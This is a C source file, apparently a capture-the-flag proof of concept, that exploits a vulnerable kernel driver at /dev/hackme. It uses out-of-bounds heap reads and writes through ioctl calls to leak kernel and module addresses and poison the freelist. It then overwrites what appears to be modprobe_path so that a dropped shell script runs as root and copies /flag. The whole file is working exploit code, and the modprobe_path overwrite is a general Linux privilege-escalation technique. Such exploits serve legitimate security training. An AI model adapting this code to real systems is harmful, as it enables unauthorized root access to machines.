//poc.c
//gcc poc.c -o poc -w -static
#include<stdio.h>
#include<unistd.h>
#include<fcntl.h>

struct heap{
    size_t id;
    size_t *data;
    size_t len;
    size_t offset;
};
int fd;

void alloc(int id, char *data, size_t len){
    struct heap h;
    h.id = id;
    h.data = data;
    h.len = len;
    ioctl(fd,0x30000,&h);
}

void delete(int id){
    struct heap h;
    h.id = id;
    ioctl(fd,0x30001,&h);
}

void cin_kernel(int id, char *data, size_t len, size_t offset){
    struct heap h;
    h.id = id;
    h.data = data;
    h.len = len;
    h.offset = offset;
    ioctl(fd,0x30002,&h);
}

void cout_kernel(int id, char *data, size_t len, size_t offset){
    struct heap h;
    h.id = id;
    h.data = data;
    h.len = len;
    h.offset = offset;
    ioctl(fd,0x30003,&h);
}

int main(){
    fd = open("/dev/hackme",0);
    size_t heap_addr,kernel_addr,mod_tree_addr,ko_addr,pool_addr;
    char *mem = malloc(0x1000);
    if(fd < 0){
        printf("[*]OPEN KO ERROR!\n");
        exit(0);
    }
    memset(mem,'A',0x100);
    alloc(0,mem,0x100);
    alloc(1,mem,0x100);
    alloc(2,mem,0x100);
    alloc(3,mem,0x100);
    alloc(4,mem,0x100);
    
    delete(1);
    delete(3);
    cout_kernel(4,mem,0x100,-0x100);
    heap_addr = *((size_t  *)mem) - 0x100;
    printf("[*]heap_addr: 0x%16llx\n",heap_addr);
    cout_kernel(0,mem,0x200,-0x200);
    kernel_addr = *((size_t *)mem) - 0x0472c0;
    mod_tree_addr = kernel_addr + 0x011000;
    printf("[*]kernel_addr: 0x%16llx\n",kernel_addr);
    printf("[*]mod_tree_add: 0x%16llx\n",mod_tree_addr);
    
    memset(mem,'B',0x100);
    *((size_t  *)mem) = mod_tree_addr + 0x50;
    cin_kernel(4,mem,0x100,-0x100);
    memset(mem,'C',0x100);
    alloc(5,mem,0x100);
    alloc(6,mem,0x100);
    cout_kernel(6,mem,0x40,-0x40);
    ko_addr = *((size_t *)mem) - 0x2338;
    pool_addr = ko_addr + 0x2400;
    printf("[*]ko_addr: 0x%16llx\n",ko_addr);
    printf("[*]pool_addr: 0x%16llx\n",pool_addr);

    delete(2);
    delete(5);
    memset(mem,'D',0x100);
    *((size_t  *)mem) = pool_addr + 0xc0;
    cin_kernel(4,mem,0x100,-0x100);
    alloc(7,mem,0x100);
    alloc(8,mem,0x100);

    *((size_t *)mem) = kernel_addr + 0x03f960;
    *((size_t *)(mem+0x8)) = 0x100;
    cin_kernel(8,mem,0x10,0);

    strncpy(mem,"/home/pwn/copy.sh\0",18);
	cin_kernel(0xc,mem,18,0);
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
	system("chmod +x /home/pwn/copy.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");
	system("chmod +x /home/pwn/sir");

	system("/home/pwn/sir");
	system("cat /home/pwn/flag");
    return 0;
}
